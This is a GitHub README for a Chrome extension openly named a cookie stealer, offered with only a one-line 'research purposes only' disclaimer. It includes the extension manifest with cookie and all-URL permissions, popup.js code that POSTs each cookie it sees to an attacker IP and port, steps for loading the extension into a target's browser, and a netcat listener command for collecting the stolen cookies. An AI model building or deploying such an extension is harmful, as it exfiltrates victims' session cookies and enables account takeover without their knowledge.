# Cookie_Stealer_Chrome_Extension
This is a chrome extention that will send all cookies it sees while the user browses the web to a specified IP Address and Port!

# WARNING: This is for research purposes only! I am not resposible for any damage caused to any computer or computer system using this software!  
# How The Heck To Use It:
Download:  
```git clone https://github.com/SteamPunk424/Cookie_Stealer_Chrome_Extension```  
Open manifest.json with nano and change the host permissions to allow the extention to send to your ip/attacker computer:  
```
{
  "manifest_version": 3,
  "name": "Cookie Sender",
  "version": "1.0",
  "action": {
    "default_popup": "popup.html"
  },
  "permissions": [
    "cookies",
    "tabs"
  ],
  "host_permissions": [
    "<all_urls>",
    "http://127.0.0.1/*",
    "http://10.10.15.17:8080/*" <---- This one here.
  ]
}

```
Also change popup.js to send the cookie to your ip and port of your choosing:    
```
function sendCookieToProxy(cookie) {
  fetch('http://10.10.15.17:8080/cookie', { <--- Your ip and port
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(cookie)
  }).catch(err => {
    console.error('Failed:', err);
  });
}
```


# Installation to target:  
Open Chrome or Chromium and head to "chrome://extensions/" and turn on developer mode.  
Once developer mode is enabled click "load unpacked" and set the folder to the "Cookie_Stealer_Chrome_Extension" folder.  
This will install the chrome extention to the target.  

Catch the cookie requests by using netcat from the attacker computer:  
```nc -lvnp $PORT```

As the target browses to websites you will catch all of there cookies with netcat from the various places they visit.
